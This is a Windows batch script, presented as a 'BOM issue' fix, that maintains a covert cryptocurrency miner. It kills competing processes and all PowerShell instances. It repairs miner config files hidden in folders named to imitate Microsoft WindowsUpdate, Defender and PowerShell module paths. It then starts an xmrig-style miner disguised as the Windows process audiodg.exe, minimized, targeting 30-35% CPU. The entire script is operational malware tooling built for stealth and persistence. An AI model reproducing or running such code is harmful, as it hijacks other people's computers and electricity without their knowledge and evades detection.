@echo off
title COMPLETE FIX - BOM Issue
color 0A

cls
echo ================================================================
echo  COMPLETE FIX FOR BOM ISSUE
echo  This will fix the immediate problem and deploy correctly
echo ================================================================
echo.

echo Step 1: Stopping any running miners and watchdogs...
taskkill /F /IM xmrig.exe 2>nul
taskkill /F /IM audiodg.exe 2>nul
for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq powershell.exe" /FO LIST ^| findstr "PID:"') do (
    taskkill /F /PID %%a 2>nul
)
echo [OK] All processes stopped
echo.

echo Step 2: Fixing all existing config files (removing BOM)...
powershell -NoProfile -Command "$locations = @('C:\ProgramData\Microsoft\Windows\WindowsUpdate', 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv', 'C:\ProgramData\Microsoft\Network\Downloader', 'C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\PowerShell', 'C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\Defender', 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates', 'C:\Users\%USERNAME%\AppData\Local\Temp\WindowsUpdateCache'); $fixed = 0; foreach ($loc in $locations) { $configPath = Join-Path $loc 'config.json'; if (Test-Path $configPath) { $content = Get-Content $configPath -Raw; [System.IO.File]::WriteAllText($configPath, $content, [System.Text.UTF8Encoding]::new($false)); $fixed++ } }; Write-Host \"[OK] Fixed $fixed config files\""
echo.

echo Step 3: Testing if miner can run now...
set MINER="C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"
set CONFIG="C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"

if exist %MINER% (
    echo Starting miner with fixed config...
    timeout /t 2 >nul
    start "" /MIN %MINER% --config=%CONFIG%
    timeout /t 3 >nul
    
    tasklist /FI "IMAGENAME eq audiodg.exe" | find /I "audiodg.exe" >NUL
    if %ERRORLEVEL%==0 (
        echo.
        echo ================================================================
        echo  SUCCESS! MINER IS RUNNING!
        echo ================================================================
        echo.
        echo The BOM issue is FIXED!
        echo Miner is running with PID:
        tasklist /FI "IMAGENAME eq audiodg.exe" /FO LIST | findstr "PID Memory"
        echo.
        echo Check Task Manager to verify.
        echo Expected CPU usage: 30-35%%
        echo.
        echo To enable full deployment with all features:
        echo   Run: START_ULTIMATE_FIXED.bat
        echo.
    ) else (
        echo.
        echo [WARN] Miner started but may have exited
        echo Try running TEST_DEPLOYED_CONFIG.bat to see output
        echo.
    )
) else (
    echo.
    echo [INFO] No miner deployed yet.
    echo Run: START_ULTIMATE_FIXED.bat to deploy
    echo.
)

pause
